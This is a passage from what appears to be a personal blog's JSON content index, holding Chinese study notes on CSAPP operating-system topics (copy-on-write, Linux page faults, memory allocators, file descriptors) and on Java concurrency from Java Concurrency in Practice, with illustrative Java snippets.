title=\"CopyOnWrite\"></a>CopyOnWrite</h4><ul>\n<li>只要进程没有试图写这些COW的区域，那么就可以共享</li>\n<li>如果进程试图写这些区域中的某个页面时，就会触发一个保护故障，从而会在物理内存中创建这个页面的一个新副本，更新页表条目指向这个新副本</li>\n<li>把复制副本的工作推迟到了最后时刻，从而最充分的利用了物理内存</li>\n</ul>\n<h4 id=\"Linux的虚拟内存和缺页处理\"><a href=\"#Linux的虚拟内存和缺页处理\" class=\"headerlink\" title=\"Linux的虚拟内存和缺页处理\"></a>Linux的虚拟内存和缺页处理</h4><ul>\n<li>Linux将虚拟内存组织成区域的集合，一个区域是已经存在的（已分配的）虚拟内存的连续片（比如代码段、数据段、堆等）</li>\n<li>每个存在的虚拟页面都保存在某个区域中</li>\n<li>区域使得内核无需记录那些不存在的虚拟页</li>\n<li>区域链表可以通过位于内核虚拟内存的<code>task_struct</code>中相关信息获得<ul>\n<li><code>mm_struct</code>的<code>mmap</code>：指向一个<code>vm_area_structs</code>的链表，每个<code>vm_area_structs</code>都描述了当前虚拟地址空间的一个区域</li>\n<li><code>mm_struct</code>的<code>pgd</code>：指向第一级页表（页全局目录）的基址，内核运行这个进程时，把<code>pgd</code>放在CR3控制寄存器</li>\n<li><code>task_struct</code>：包含或指向内核运行该进程所需要的所有信息，比如PID、指向用户栈的指针、可执行目标文件的名字、程序计数器</li>\n</ul>\n</li>\n<li>Linux虚拟内存的缺页异常的处理程序<ul>\n<li>使用内核为每个进程维护的区域结构的链表来判断是否是<ul>\n<li>访问不存在的页面(从而段错误)</li>\n<li>缺页是因为内存访问不合法（比如写一个只读页面）导致的（从而保护异常）</li>\n<li>正常缺页</li>\n</ul>\n</li>\n<li>为什么不使用PTE的是否为null来判断呢？这样子就要维护所有的PTE，其中有的有效位为1有的为0有的PTE的某个字段为null标志这是未被映射的虚拟内存页</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"动态内存分配\"><a href=\"#动态内存分配\" class=\"headerlink\" title=\"动态内存分配\"></a>动态内存分配</h4><ul>\n<li>碎片<ul>\n<li>内部碎片（一个已分配的块比payload大时发生，只取决于分配器的实现以及以前的请求模式）</li>\n<li>外部碎片（空闲内存合计起来足以满足一个请求，但是没有单独一块满足时，不仅取决于以前的模式、分配器的工作方式，还取决与未来请求的模式）</li>\n</ul>\n</li>\n<li>分离的空闲链表：比如可以$[2^n-1,2^{n+1}]$这个区间大小的页维护在一个空闲链表中<ul>\n<li>简单分离存储：不分割，不合并</li>\n<li>分离适配：确定请求的大小类，然后首次适配（找不到就到更大的大小类去找）。可选的分割，剩余部分insert到适当的空闲链表中。实在没有，就请求OS分配，然后从这个新的中分配出Request的那块，剩下的insert到空闲链表中。释放时执行合并，结果放在相应的空闲链表。malloc就是这样做的</li>\n</ul>\n</li>\n<li>buddy<ul>\n<li>每个大小类都是2的幂，为了找到$2^k$，需要找$2^p(k\\leq p)$，如果$k&lt;p$，则递归的二分这个块，每次二分时，剩下的另一块都insert到空闲链表中。要释放时，合并空闲的buddy，但遇到一个已分配的buddy时，停止合并。buddy之间的地址差异只是1bit。如果大部分请求不是2的幂大小，则内部碎片多</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"Linux的文件\"><a href=\"#Linux的文件\" class=\"headerlink\" title=\"Linux的文件\"></a>Linux的文件</h3><ul>\n<li>内核用三个数据结构来表示打开的文件<ul>\n<li>描述符表<ul>\n<li>每个进程都有自己的描述符表</li>\n<li>由进程打开的文件描述符索引</li>\n<li>每个打开的描述符表项指向文件表的一个表项</li>\n</ul>\n</li>\n<li>文件表<ul>\n<li>所有进程共享这个表，表示打开的文件集合</li>\n<li>每个表项包含：当前文件位置、引用计数（指向该表项的描述符表项数目），指向v-node表中的对应表项的指针</li>\n<li>内核不会删除一个文件表表项，直到其引用计数为0</li>\n<li>多个打开文件表的表项可以指向同一个v-node表的表项，比如同一进程两次调用open同一文件，是不同的文件句柄，同样的inode，这样子每个都有自己的文件位置</li>\n</ul>\n</li>\n<li>v-node表<ul>\n<li>所有进程共享这张v-node表</li>\n<li>每个表项包含stat结构中的大多数信息</li>\n<li>包含文件大小、文件类型、file access</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>fork中，子进程复制父进程的描述符表，所以指向相同的打开文件表表项</li>\n<li>io重定向（比如dup2）则是使得两个描述符表项指向同一个打开文件表的表项</li>\n</ul>\n","slug":"My-CSAPP-Note","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"OS","slug":"OS","permalink":"https://h-zex.github.io/tags/OS/"},{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/tags/CSAPP/"},{"name":"Linux","slug":"Linux","permalink":"https://h-zex.github.io/tags/Linux/"}]},{"title":"My Java Concurrent Note","date":"2019-04-02T04:49:04.000Z","path":"2019/04/02/Java-Concurrent-Note/","text":"以下大部分是java Concurrency in Practice的笔记，以JCIP简称之 对象的状态 （非正式意义上），对象的状态是指存储在状态变量中的数据，可能包括其他依赖对象的域（例如HashMap的Map.Entry对象） 对象的状态中包含了任何可能影响其外部可见行为的数据 线程安全性的定义 正确性的含义 某个类的行为与其规范完全一致。在良好的规范中通常会定义各种不变性条件（Invariant）来约束对象的状态，以及定义各种后验条件来描述对象操作的结果 a postcondition is a condition or predicate that must always be true just after the execution of some section of code or after an operation in a formal specification. 当多个线程访问某个类时，这个类始终能够表现出正确的行为，那么就称这个类是线程安全的 当多个线程访问一个对象时， 如果不用考虑这些线程在运行时环境下的调度和交替执行， 也不需要进行额外的同步， 或者在调用方进行任何其他的协调操作， 调用这个对象的行为都可以获得正确的结果， 那这个对象是线程安全的 JCIP中“同步”的含义 synchronized关键字 volatile变量 显式锁 原子变量 竞态条件 在并发编程中，由于不恰当的执行时序而出现不正确的结果（这不是正式的定义） 竞态条件类型举例 先检查后执行（比如if(i==1) {i=10;}）。大多数竞态条件的本质：基于一种可能失效的观察结果来做出判断或执行计算 并非所有的竞态条件都是数据竞争，同样并非所有的数据竞争都是竞态条件 数据竞争 访问共享的非final类型的域时没有采用同步来协同，则会出现数据竞争 A data race occurs when: two or more threads in a single process access the same memory location concurrently, and at least one of the accesses is for writing, and the threads are not using any exclusive locks to control their accesses to that memory. When these three conditions hold, the order of accesses is non-deterministic, and the computation may give different results from run to run depending on that order. Some data-races may be benign (for example, when the memory access is used for a busy-wait), but many data-races are bugs in the program. ref from 在java的内存模型中，如果在代码中存在数据竞争，那么这段代码就没有确定的语义 原子性 假定有两个操作A、B，从执行A的线程来看，当另一个线程执行B时，要么将B完全执行完，要么完全不执行B，那么A和B对彼此来说是原子的 原子操作是指，对于访问同一个状态的所有操作（包括这个操作本身）来说，这个操作是以一种原子方式执行 与事务应用程序中的和原子性有相同的含义：一组语句作为一个不可分割的单元被执行 volatile变量 只有成员变量才能使用它 用来确保变量的更新操作通知到其他线程 以下代码可以复现，无论是否有server模式 1234567891011121314class VolatileTest &#123; // 去掉volatile，则无限循环 static volatile boolean sleep = false; public static void main(String[] args) throws InterruptedException &#123; new Thread(() -&gt; &#123; while (!sleep) &#123; &#125; System.out.println(\"out of sleep\"); &#125;).start(); Thread.sleep(100); sleep = true; &#125;&#125; anything that was visible to thread A when it writes to volatile field f becomes visible to thread B when it reads f. synchronized在内存可见性上的作用比volatile变量更强 依赖volatile变量来控制状态的可见性，通常比使用锁的代码更加脆弱，更加难以理解 无法确保原子性（锁可以确保原子性和可见性） 正确的使用方式 确保他们状态的可见性 确保它们所引用的状态的可见性 This declares a volatile reference to an array, which might not be what you want. With a volatile reference to an array, reads and writes of the reference to the array are treated as volatile, but the array elements are non-volatile. To get volatile array elements, you will need to use one of the atomic array classes in java.util.concurrent (provided in Java 5.0). (ref from FindBugs) 标志一些重要的程序生命周期事件的发生 满足以下所有条件时，才应该使用 对变量的写入不依赖于当前值，或者只有单个线程写该变量 该变量不会与其他状态变量一起纳入不变性条件中 在访问变量时不需要加锁 关于重排序(来自于) 旧内存模型 Under the old memory model, accesses to volatile variables could not be reordered with each other, but they could be reordered with nonvolatile variable accesses. 新内存模型（新内存模型是JSR133） Under the new memory model, it is still true that volatile variables cannot be reordered with each other. The difference is that it is now no longer so easy to reorder normal field accesses around them. Writing to a volatile field has the same memory effect as a monitor release, and reading from a volatile field has the same memory effect as a monitor acquire. In effect, because the new memory model places stricter constraints on reordering of volatile field accesses with other field accesses, volatile or not, anything that was visible to thread A when it writes to volatile field f becomes visible to thread B when it reads f. 123456789101112131415class VolatileExample &#123; int x = 0; volatile boolean v = false; public void writer() &#123; x = 42; v = true; &#125; public void reader() &#123; if (v == true) &#123; // uses x - guaranteed to see 42. // This would not have been true under the old memory model. &#125; &#125;&#125; Effectively, the semantics of volatile have been strengthened substantially, almost to the level of synchronization. Each read or write of a volatile field acts like “half” a synchronization, for purposes of visibility. Note that it is important for both threads to access the same volatile variable in order to properly set up the happens-before relationship. It is not the case that everything visible to thread A when it writes volatile field f becomes visible to thread B after it reads volatile field g. The release and acquire have to “match”(i.e., be performed on the same volatile field) to have the right semantics 文档－应该详细记载的内容 同步策略（什么状态由什么锁保护、可见性如何维护） 加锁顺序 没有加锁情况下的同步策略（比如使用一个flag阻止其他线程在flag为true之前使用某资源） 资源池的配置（避免资源依赖死锁） 如果不能通过open call来避免死锁，那么应该详细记载如何避免在调用时出现死锁 应该将条件队列相关联的条件谓词以及在这些谓词上等待的操作都写入文档 对象的初始化 即使某个对象的引用对于其他线程是可见的，也并不意味着对象状态对于使用该对象的线程一定是可见的 为了确保对象状态能够呈现出一致的视图，必须使用同步 this逸出 只有当对象的构造函数返回时，对象才处于可预测的和一致的状态。因此，从构造函数发布对象时，发布了一个尚未构造完成的对象。 例子： 在构造函数启动线程 在构造函数调用一个可以override的方法（非private、非final的方法，可以被子类override） 可以通过使用start函数来启动线程、使用工厂方法和私有构造函数（即不要再构造函数启动，而是在工厂方法中，构造函数返回后才启动） Final域 还有一种情况可以安全地访问一个共享域， 即这个域声明为 final 时 在java内存模型中，final域能确保初始化过程的安全性，从而可以不受限制的访问不可变对象，并在共享这些对象时无需同步。为了维持这种初始化安全性的保证，需要满足不可变性的所有需求 状态不可修改 所有域都是final类型 正确的构造 这种保证还延伸到正确创建的对象中所有final类型的域，在没有额外同步的情况下，也可以安全的访问final类型的域。不过，如果这些final域指向的是可变对象，那么访问这些域所指向的对象的状态时还是需要同步 在发布不可变对象时，没有使用同步，也可以安全地访问该对象 原子变量 如果有大量线程要访问相同的原子值， 性能会大幅下降， 因为乐观更新需要太多次重试。 Java SE 8 提供了 LongAdder 和 LongAccumulator 类来解决这个问题。LongAdder 包括多个变量（加数)， 其总和为当前值。可以有多个线程更新不同的加数，线程个数增加时会自动提供新的加数。通常情况下， 只有当所有工作都完成之后才需要总和的值， 对于这种情况，这种方法会很高效。性能会有显著的提升。 Double Checked Locking(DCL) 来自于 示例代码 12345678910111213// double-checked-locking - don't do this!private static Something instance = null;public Something getInstance() &#123; if (instance == null) &#123; synchronized (this) &#123; if (instance == null) instance = new Something(); &#125; &#125; return instance;&#125; There’s only one problem with it – it doesn’t work. Why not? The most obvious reason is that the writes which initialize instance and the write to the instance field can be reordered by the compiler or the cache, which would have the effect of returning what appears to be a partially constructed Something. The result would be that we read an uninitialized object. There is no way to fix it using the old Java memory model. Under the new memory model, making the instance field volatile will “fix” the problems with double-checked locking, because then there will be a happens-before relationship between the initialization of the Something by the constructing thread and the return of its value by the thread that reads it.（我猜，这个happen-before是不是就是程序顺序规则（each action in a thread haappens-before every action in that thread that come later in the program order）和传递性和volatile 变量规则的结合——就是instance=new Something()在单线程中必须保证构造操作在赋值给instance操作之前，然后volatile又保证了写入在读取之前，所以一旦另一个线程读取了instance，则根据传递性，构造操作已经完成了） 1234567891011public class Something &#123; private Something() &#123;&#125; private static class LazyHolder &#123; static final Something INSTANCE = new Something(); &#125; public static Something getInstance() &#123; return LazyHolder.INSTANCE; &#125;&#125; This code is guaranteed to be correct because of the initialization guarantees for static fields; if a field is set in a static initializer, it is guaranteed to be made visible, correctly, to any thread that accesses that class. 锁 作用 互斥 原子性（复合操作的执行过程中持有一个锁，则这组操作成为原子操作） 内存可见性（所有线程都能看到共享变量的最新值——只需要所有线程都在同一个锁上同步） synchronized 用于实现原子性 可重入 确定临界区 Constructors in Java can not use the synchronized keyword，但是可以synchronized(this){} 内存可见性——某个线程修改了对象状态后，其他线程可以看到发生的状态的变化 每个对象都有一个内部锁，该锁有一个内部条件（条件对应Object对象的final方法wait、notify、notifyAll方法）（所以一旦某个对象的一个synchronized方法被调用后，该对象的另一个synchronized方法会被阻塞） 调用synchronized静态方法获得相关的类对象（Class对象）的内部锁。要注意，使用不同的classLoader加载出来的Class对象是不同的 监视器 用Java的术语来讲，监视器具有如下特性： 监视器是只包含私有域的类。 每个监视器类的对象有一个相关的锁。 使用该锁对所有的方法进行加锁。换句话说，如果客户端调用obj.meth0d(),那么obj对象的锁是在方法调用开始时自动获得（这是获得锁的唯一途径），并且当方法返回时自动释放该锁（无论是正常退出还是异常退出）。因为所有的域是私有的，这样的安排可以确保一个线程在对对象操作时，没有其他线程能访问该域 该锁可以有任意多个相关条件 Java设计者以不是很精确的方式采用了监视器概念，Java中的每一个对象有一个内部的锁和内部的条件。如果一个方法用synchronized关键字声明，那么，它表现的就像是一个监视器方法。通过调用wait/notifyAll/notify来访问条件变量。然而，在下述的3个方面Java对象不同于监视器，从而使得线程的安全性下降： 域不要求必须是private。 方法不要求必须是synchronized。 内部锁对客户是可用的。 局限 不能中断一个正在试图获得锁的线程 没有超时 只有单一的条件 不提供公平的锁 内存可见性 最低安全性 某个线程没有同步情况下读取变量，可能会得到一个失效值，但这个值至少是之前某个线程设置的，而不是随机的 Java内存模型要求，变量的读取和写入必须是原子操作，但是非volatile的long，double例外 JVM允许将64bit的读或写操作分解为两个32bit的操作，因此可能无法满足最低安全性（除非用volatile声明或是用锁保护） 不可变对象需要满足的条件 对象创建后其状态不能修改 对象的所有域是final类型的（可以不用，比如String的hashCode这个field） 对象是正确创建的（创建期间，this没有逸出） misc 对象内部可以使用可变对象来管理状态 例子 12345678910111213public final class ThreeStooges &#123; private final Set&lt;String&gt; stooges = new HashSet&lt;String&gt;(); public ThreeStooges() &#123; stooges.add(\"Moe\"); stooges.add(\"Larry\"); stooges.add(\"Curly\"); &#125; public boolean isStooge(String name) &#123; return stooges.contains(name); &#125;&#125; 使用volatile+不可变对象来实现一组状态的原子操作 123456789101112131415161718192021222324252627282930313233343536class OneValueCache &#123; private final BigInteger lastNumber; private final BigInteger[] lastFactors; public OneValueCache(BigInteger i, BigInteger[] factors) &#123; lastNumber = i; // 如果没有这个copyOf，就不是不可变的 lastFactors = Arrays.copyOf(factors, factors.length); &#125; public BigInteger[] getFactors(BigInteger i) &#123; if (lastNumber == null || !lastNumber.equals(i)) return null; else return Arrays.copyOf(lastFactors, lastFactors.length); &#125;&#125;public class VolatileCachedFactorizer implements Servlet &#123; private volatile OneValueCache cache = new OneValueCache(null, null); public void service(ServletRequest req, ServletResponse resp) &#123; BigInteger i = extractFromRequest(req); // 如果这里多个请求到来，某个请求调用getFactors调用到一半 // 然后另一个请求则把cache赋值成另外一个对象，那么有没有问题？ // 似乎c++就不可以这样做，因为这个需要自动垃圾收集 BigInteger[] factors = cache.getFactors(i); if (factors == null) &#123; factors = factor(i); cache = new OneValueCache(i, factors); &#125; encodeIntoResponse(resp, factors); &#125;&#125; 正确的发布 发布（publish）：使对象能够在当前作用域之外的代码中使用 逸出（escape）：某个不该发布的对象被发布 不可变对象可以通过任意的机制发布 3.4节，不可变对象那里，代码3-13使用了volatile来保证其他线程看到最新的引用。另外，3.5.2节说，即使发布不可变对象时，没有使用同步，仍然可以安全的访问该对象（上面那一段说，“即使某个对象的引用对于其他线程可见，也不意味着对象的状态对于使用该对象的线程一定是可见的”）。这里的“不需要同步”的含义是指，不需要同步即可以保证对象状态的可见性，而不是说，每次更新引用，都会让其他线程看到新的引用值。 12345678910111213141516171819202122class SynTest &#123; static FC fc = null; public static void main(String[] args) throws InterruptedException &#123; Thread t1 = new Thread(() -&gt; &#123; fc = new FC(); &#125;); Thread t2 = new Thread(() -&gt; &#123; while (fc == null) &#123; &#125; int n = fc.n * 10; assert n * 10 == 50 * 20; &#125;); t2.start(); Thread.sleep(100); t1.start(); &#125; static class FC &#123; final int n = 10; &#125;&#125; 第二个线程没有退出。所以，其实不可变对象的发布时不需要同步的含义应该是“另一个线程可以看到完整的对象状态”。（很奇怪，如果把两个start的位置颠倒，或者是去掉sleep，则会导致成功结束) Java内存模型为不可变对象的共享提供了一种特殊的初始化安全性保证 即使在发布不可变对象的引用时没有使用同步，也可以安全的访问该对象。为了实现这种安全，对象必须满足上面提到的不可变对象的所有要求 这种保证还包括被正确创建对象中的所有final类型的域。但是如果这些域是可变对象，那么在访问时还是需要同步 事实不可变对象（比如某个Date对象被构造后，就只执行读操作，类似于java要求lambda可以读取的lambda外变量是“事实不可变的”）必须通过安全的方式发布 可变对象必须通过安全的方式发布，并且必须是线程安全的或者某个锁保护起来 可变对象的正确的发布 即使某个对象的引用对于其他线程是可见的，也不意味着对象状态对于使用该对象的线程是一定可见的。为了确保对象状态呈现出一致性视图（对象的引用与对象的状态必须同时对其他线程可见），必须要使用同步（包括发布时和使用时） 常用的发布模式 在静态初始化函数中初始化一个对象引用（不知道“静态初始化函数”是否等价于“静态初始化器”）（因为静态初始化器由JVM在类的初始化阶段执行，JVM内部存在同步机制） 1public static Holder holder = new Holder(42); 虚拟机会保证一个类的&lt;clinit&gt;()方法在多线程环境中被正确地加锁、同步,如果多个线程同时去初始化一个类,那么只会有一个线程去执行这个类的&lt;clinit&gt;()方法,其他线程都需要阻塞等待,直到活动线程执行&lt;clinit&gt;()方法完毕 &lt;clinit&gt;()方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块(static{}块)中的语句合并产生的 来自深入理解JVM 将对象的引用保存在volatile类型的域或者AtomicReference对象中 将对象的引用保存在某个正确构造对象的final类型域中 将对象的引用保存在一个由锁保护的域中 线程安全容器（比如Hashtable、synchronizedMap、ConcurrentMap、Vector、CopyOnWriteArrayList、CopyOnWriteArraySet、synchronizedList、synchronizedSet、BlockingQueue、ConcurrentLinkedQueue）内部的同步意味着将对象放入到某个容器中，将满足这一条要求） Future、Exchanger也可以 lambda使用外部的对象（或value type的变量） 以下均为我个人根据final域的特性认为的——不知道final域与final变量的差别是什么 lambda可以使用外部的final或事实final的变量 如果是这个final对象引用的变量，没有问题，可见（就是引用对于其他线程可见时，其内部的状态也是，可以保证一致性） 如果引用的是可变对象，则要同步 内部类与final变量 TODO：内部类引用外部的变量时，不要求其为final的，那么怎么办，可见性如何保证 volatile vs 锁 锁可以确保可见性和原子性 volatile只确保可见性 MISC 开发服务器应用时，要始终加上-server参数，client模式的JVM优化与server的不一样 内存屏障 MFENCE, LFENCE, SFENCE (Ref from intel manual 325462-sdm-vol-1-2abcd-3abcd) MFENCE: Performs a serializing operation on all load-from-memory and store-to-memory instructions that were issued prior the MFENCE instruction. This serializing operation guarantees that every load and store instruction that precedes the MFENCE instruction in program order becomes globally visible before any load or store instruction that follows the MFENCE instruction. The MFENCE instruction is ordered with respect to all load and store instructions, other MFENCE instructions, any LFENCE and SFENCE instructions, and any serializing instructions (such as the CPUID instruction). MFENCE does not serialize the instruction stream. SFENCE: Orders processor execution relative to all memory stores prior to the SFENCE instruction. The processor ensures that every store prior to SFENCE is globally visible before any store after SFENCE becomes globally visible. The SFENCE instruction is ordered with respect to memory stores, other SFENCE instructions, MFENCE instructions, and any serializing instructions (such as the CPUID instruction). It is not ordered with respect to memory loads or the LFENCE instruction. LFENCE: Performs a serializing operation on all load-from-memory instructions that were issued prior the LFENCE instruction. Specifically, LFENCE does not execute until all prior instructions have completed locally, and no later instruction begins execution until LFENCE completes. In particular, an instruction that loads from memory and that precedes an LFENCE receives data from memory prior to completion of the LFENCE. (An LFENCE that follows an instruction that stores to memory might complete before the data being stored have become globally visible.) Instructions following an LFENCE may be fetched from memory before the LFENCE, but they will not execute until the LFENCE completes. read barrier, write barrier, (Ref) Read barrier: A read barrier is a data dependency barrier plus a guarantee that all the LOAD operations specified before the barrier will appear to happen before all the LOAD operations specified after the barrier with respect to the other components of the system. A read barrier is a partial ordering on loads only; it is not required to have any effect on stores. Read memory barriers imply data dependency barriers, and so can substitute for them. [!] Note that read barriers should normally be paired with write barriers; see the “SMP barrier pairing” subsection. Data dependency barrier: A data dependency barrier is a weaker form of read barrier. In the case where two loads are performed such that the second depends on the result of the first (eg: the first load retrieves the address to which the second load will be directed), a data dependency barrier would be required to make sure that the target of the second load is updated after the address obtained by the first load is accessed. General memory barriers. A general memory barrier gives a guarantee that all the LOAD and STORE operations specified before the barrier will appear to happen before all the LOAD and STORE operations specified after the barrier with respect to the other components of the system. Write memory barrier: A write memory barrier gives a guarantee that all the STORE operations specified before the barrier will appear to happen before all the STORE operations specified after the barrier with respect to the other components of the system. 设计线程安全类 三个要素 找出构成对象状态的所有变量 如果在对象域中引用了其他对象，那么该对象的状态就包含被引用对象的域 在定义哪些变量将构成对象的状态时，只考虑对象拥有的数据 找出约束状态变量的不变性条件 建立对象状态的并发访问管理策略 同步策略定义了如何在不违背对象不变条件或后验条件（在操作中会包含一些后验条件来判断状态的迁移是否有效——比如要求某变量如果当前是17，那么下一次更新是18）的情况下对其状态的访问操作进行协同 同步策略规定了如何将不可变性、线程封闭、加锁机制等结合起来维护线程的安全性。还规定了哪些变量由哪些锁来保护 必须要将同步策略写为正式文档 尽可能使用final域以缩小状态空间 如果变量的某些状态是无效的，那么就要对该变量进行封装以避免用户的修改使得该变量处于无效状态。如果某个操作中存在无效的状态转换那么该操作就必须是原子的 如果一个类是由多个独立且线程安全的状态变量组成，并且所有的操作都不包含无效的状态转换，那么可以将线程安全性委托给底层的状态变量 如果一个状态变量是线程安全的，并且没有任何不变性条件来约束它的值，在变量的操作上也不存在任何不允许的状态转换（然而按照线程安全的定义，似乎如果满足以上要求，那么线程安全也就必然满足），那么就可以安全地发布这个变量 当把线程安全委托给底层的线程安全对象时，如果这些变量不是final，那么会导致一个问题——引用可能会引用了另一个对象。 基于现有的线程安全类添加特性 最好的方法是直接修改原始类，这需要理解代码中的同步策略。好处在于所有实现同步策略的代码在同一个源文件中 另一种方法是extend这个类，但是可能有的类的一些状态是private，子类访问不到，所以行不通。不好的地方在于同步策略的实现被分布到多个单独维护的源文件中，如果底层的类改变了同步策略那么子类就不安全了。 客户端加锁：对于使用对象X的用户代码，在用户代码中，使用X本身用于保护其状态的锁来保护这段用户代码。这里的问题在于，如果文档没有明确指出X使用的锁，那么这个锁在以后版本中可能会修改，从而导致用户代码相对于X的代码不是原子的（在用户代码执行过程中，X内的代码可能执行）。这种会破坏同步策略的封装性（类似于extend会破坏实现的封装性）。与前一种一样，都是将派生类的行为与基类的行为耦合在一起 组合：类似于Collections.synchronizedXXX，用户传递一个对象给该方法（转移所有权，以后都通过这个工厂方法返回的对象来操作），新对象内使用委托和加锁来实现。这种不依赖于被委托对象的线程安全性和使用的锁策略 依赖状态的操作 类的不变性条件和后验条件约束了在对象上有哪些状态和状态转换是有效的。在某些对象的方法中还包含一些基于状态的先验条件（比如，从队列中pop时，队列必须非空）。如果某个操作中包含有基于状态的先验条件，则这个操作就叫做依赖状态的操作 使用私有的锁 vs 使用对象的内置锁 优点 私有锁可以将锁封闭起来，避免用户代码得到锁，以避免用户代码参与到同步策略中 如果使用内置锁，要想验证锁是否被正确使用，需要检查整个程序 实例分析一个线程安全的车辆追踪器的代码解析 不可变的Point类，因为不可变，所以复制map时只需要复制map的结构，无需复制Point的内容。返回的unmodifableMap也类似如此。（代码来源，JCIP代码清单4.7和4.6） 123456789101112131415161718192021222324252627282930313233343536373839class DelegatingVehicleTracker &#123; private final ConcurrentMap&lt;String, Point&gt; locations; private final Map&lt;String, Point&gt; unmodifiableMap; // 构造函数的安全依赖于用户——如果用户在构造函数运行时， // 修改参数points的内容，那么locations的视图就可能是不一致的。 // 并且，用户需要自己保证这个DelegatingVehicleTracker类是安全的发布的， // 从而，保证在构造函数运行完之前，类内的其他非静态函数不会被调用 public DelegatingVehicleTracker(Map&lt;String, Point&gt; points) &#123; locations = new ConcurrentHashMap&lt;&gt;(points); unmodifiableMap = Collections.unmodifiableMap(locations); &#125; // 返回的unmodifiableMap内部是没有同步的， // 那么，locations的修改是如何反映到unmodifiableMap的？ // 通过ConcurrentMap来保证 public Map&lt;String, Point&gt; getLocations() &#123; return unmodifiableMap; &#125; public Point getLocation(String id) &#123; return locations.get(id); &#125; public void setLocation(String id, int x, int y) &#123; if (locations.replace(id, new Point(x, y)) == null) throw new IllegalArgumentException( \"invalid vehicle name: \" + id); &#125; class Point &#123; final int x, y; public Point(int x, int y) &#123; this.x = x; this.y = y; &#125; &#125;&#125; 可变的线程安全的Point，如果在point的状态上施加不变性任何约束，那么以下就不是线程安全的，因为用户可以修改返回的point对象。（代码来源，JCIP代码清单4.11，4.12） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class PublishingVehicleTracker &#123; private final Map&lt;String, SafePoint&gt; locations; private final Map&lt;String, SafePoint&gt; unmodifiableMap; public PublishingVehicleTracker( Map&lt;String, SafePoint&gt; locations) &#123; this.locations = new ConcurrentHashMap&lt;&gt;(locations); this.unmodifiableMap = Collections.unmodifiableMap(this.locations); &#125; public Map&lt;String, SafePoint&gt; getLocations() &#123; return unmodifiableMap; &#125; public SafePoint getLocation(String id) &#123; return locations.get(id); &#125; public void setLocation(String id, int x, int y) &#123; if (!locations.containsKey(id)) throw new IllegalArgumentException( \"invalid vehicle name: \" + id); locations.get(id).set(x, y); &#125; public class SafePoint &#123; private int x, y; private SafePoint(int[] a) &#123; this(a[0], a[1]); &#125; // 此处，如果实现为`this(p.x, p.y)`就会有竞态条件， public SafePoint(SafePoint p) &#123; this(p.get()); &#125; public SafePoint(int x, int y) &#123; this.x = x; this.y = y; &#125; public synchronized int[] get() &#123; return new int[]&#123;x, y&#125;; &#125; public synchronized void set(int x, int y) &#123; this.x = x; this.y = y; &#125; &#125;&#125; ConcurrentHashMap 来自JCIP的5.2.1，不清楚JDK5之后有没有修改 使用一种粒度更细的加锁机制——分段锁 一定数量的写入线程可以并发的修改Map 迭代器具有弱一致性，而不是fail-fast（HashMap等的是fail-fast，从而如果迭代时发现数量变化了，就会抛出ConcurrentModificationException），不会抛出ConcurrentModificationException。可以容忍并发的修改 size返回的只是估计值 内部没有实现对map加锁以独占访问（对比之下，同步容器Hashtable，synchronizedMap中可以通过获取map的锁来实现独占），所以不能在用户代码通过获取map的锁来独占（所以如果确实需要独占，应该放弃ConcurrentHashMap） conditionCondition.signal要在持有锁时才能调用 lost-wake-up问题，比如说代码如下 12cnt+=1;notify(); 123while(cnt&lt;=0) &#123; wait();&#125; 然后，在检查了cnt&lt;=0这个条件后、调用wait之前，有个线程完成了cnt++;notify()的操作，那么消费者就丢失了wake-up，陷入了无限等待（如果其在等待时没有被唤醒的话）","raw":"---\ntitle: My Java Concurrent Note\ndate: 2019-04-02 12:49:04\ncategories:\n- JAVA\n- JavaConcurrency\n---\n\n> 以下大部分是*java Concurrency in Practice*的笔记，以`JCIP`简称之\n\n### 对象的状态\n\n- （非正式意义上），对象的状态是指存储在状态变量中的数据，可能包括其他依赖对象的域（例如HashMap的Map.Entry对象）\n- 对象的状态中包含了任何可能影响其外部可见行为的数据\n\n### 线程安全性的定义\n\n- 正确性的含义\n\n  - 某个类的行为与其规范完全一致。在良好的规范中通常会定义各种不变性条件（Invariant）来约束对象的状态，以及定义各种后验条件来描述对象操作的结果\n\n  - > a **postcondition** is a condition or predicate that must always be true just after the execution of some section of code or after an operation in a formal specification.\n\n- 当多个线程访问某个类时，这个类始终能够表现出正确的行为，那么就称这个类是线程安全的\n\n- 当多个线程访问一个对象时， 如果不用考虑这些线程在运行时环境下的调度和交替执行， 也不需要进行额外的同步， 或者在调用方进行任何其他的协调操作， 调用这个对象的行为都可以获得正确的结果， 那这个对象是线程安全的\n\n### JCIP中“同步”的含义\n\n- synchronized关键字\n- volatile变量\n- 显式锁\n- 原子变量\n\n### 竞态条件\n\n- 在并发编程中，由于不恰当的执行时序而出现不正确的结果（这不是正式的定义）\n- 竞态条件类型举例\n  - 先检查后执行（比如`if(i==1) {i=10;}`）。大多数竞态条件的本质：基于一种可能失效的观察结果来做出判断或执行计算\n- 并非所有的竞态条件都是数据竞争，同样并非所有的数据竞争都是竞态条件\n\n### 数据竞争\n\n- 访问共享的非final类型的域时没有采用同步来协同，则会出现数据竞争\n\n  > A data race occurs when:\n  >\n  > - two or more threads in a **single process** access the same memory location concurrently, and\n  > - at least one of the accesses is for writing, and\n  > - the threads are not using any exclusive locks to control their accesses to that memory.\n  >\n  > When these three conditions hold, the order of accesses is non-deterministic, and the computation may give different results from run to run depending on that order. Some data-races may be benign (for example, when the memory access is used for a busy-wait), but many data-races are bugs in the program.\n  >\n  > [ref from](https://docs.oracle.com/cd/E19205-01/820-0619/geojs/index.html)\n\n- 在java的内存模型中，如果在代码中存在数据竞争，那么这段代码就没有确定的语义\n\n### 原子性\n\n- 假定有两个操作A、B，从执行A的线程来看，当另一个线程执行B时，要么将B完全执行完，要么完全不执行B，那么A和B对彼此来说是原子的\n- 原子操作是指，对于访问同一个状态的所有操作（包括这个操作本身）来说，这个操作是以一种原子方式执行\n- 与事务应用程序中的和原子性有相同的含义：一组语句作为一个不可分割的单元被执行\n\n### volatile变量\n\n- 只有成员变量才能使用它\n\n- 用来确保变量的更新操作通知到其他线程\n\n  以下代码可以复现，无论是否有`server`模式\n\n  ```java\n  class VolatileTest {\n      // 